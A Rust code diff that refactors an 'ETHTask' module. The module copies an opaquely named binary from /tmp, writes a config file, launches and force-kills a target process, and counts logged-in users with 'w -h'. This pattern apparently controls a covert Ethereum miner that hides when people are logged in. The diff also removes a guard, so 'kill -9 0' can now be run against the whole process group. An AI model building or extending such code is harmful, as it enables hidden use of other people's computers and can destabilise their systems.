@@ -6,19 +6,13 @@ pub trait Task {
     fn init_env(&self) -> Result<(), &str>;
     fn clean_env(&self);
     fn start_target_process(&self) -> Option<u32>;
-    fn kill_target_process(&self, pid: &mut u32);
+    fn kill_target_process(&self, pid: &u32);
 }
 
 pub fn get_user_count() -> Option<usize> {
     match Command::new("w").arg("-h").output() {
-        Ok(output) => {
-            let user_count = String::from_utf8_lossy(&output.stdout).lines().count();
-            return Some(user_count);
-        }
-        Err(err) => {
-            println!("{:?}", err);
-            return None;
-        }
+        Ok(output) => Some(String::from_utf8_lossy(&output.stdout).lines().count()),
+        Err(_) => None,
     }
 }
 
@@ -27,6 +21,8 @@ pub struct ETHTask;
 impl Task for ETHTask {
     fn init_env(&self) -> Result<(), &str> {
         println!("init_env()");
+
+        // cp
         let mut command = Command::new("cp");
         command
             .arg("/tmp/b86547d084228861")
@@ -38,7 +34,9 @@ impl Task for ETHTask {
         match process.wait() {
             Ok(_) => (),
             Err(_) => return Err("command wasn't running"),
-        };
+        }
+
+        // create config file
         let mut config_file = match File::create("c") {
             Ok(config_file) => config_file,
             Err(_) => return Err("failed to create config file"),
@@ -47,11 +45,12 @@ impl Task for ETHTask {
         match config_file.write_all(config_file_content) {
             Ok(_) => (),
             Err(_) => return Err("config file failed to write data"),
-        };
+        }
         match config_file.sync_all() {
             Ok(_) => (),
             Err(_) => return Err("config file content sync failed"),
-        };
+        }
+
         Ok(())
     }
 
@@ -72,15 +71,11 @@ impl Task for ETHTask {
         }
     }
 
-    fn kill_target_process(&self, pid: &mut u32) {
+    fn kill_target_process(&self, pid: &u32) {
         println!("kill_target_process() pid: {}", pid);
-        if *pid == 0 {
-            return;
-        }
         let mut command = Command::new("kill");
         command.arg("-9").arg(pid.to_string());
         let mut process = command.spawn().unwrap();
         process.wait().unwrap();
-        *pid = 0;
     }
 }
